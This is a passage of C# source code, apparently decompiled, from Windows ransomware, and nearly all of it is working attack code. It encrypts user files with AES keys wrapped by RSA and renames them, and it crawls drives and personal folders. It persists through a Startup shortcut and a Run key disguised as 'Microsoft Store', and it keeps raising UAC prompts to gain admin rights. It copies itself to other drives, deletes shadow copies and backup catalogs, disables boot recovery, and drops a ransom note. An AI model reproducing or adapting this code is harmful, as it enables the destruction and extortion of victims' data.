			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
